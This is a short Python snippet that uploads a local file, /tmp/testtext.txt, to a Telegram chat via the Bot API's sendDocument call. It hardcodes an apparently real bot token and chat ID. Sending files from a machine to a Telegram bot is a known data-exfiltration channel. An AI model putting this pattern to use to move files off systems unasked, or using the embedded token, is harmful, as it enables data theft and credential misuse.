import requests

bot_token = "8042394531:AAGpZKknBiGtglUswx2ujhOnMUqHWBDUbfQ"
chat_id = "1404955569"
file_path = "/tmp/testtext.txt"

url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

files = {'document': open(file_path,"rb")}
# <input type="file" name="document">
data = {'chat_id': chat_id}

response = requests.post(url, files=files, data=data, timeout=2)

if response.status_code == 200:
    print("[+] file sent successfully")
else:
    print("[-] failed to send file")
    print(response.text)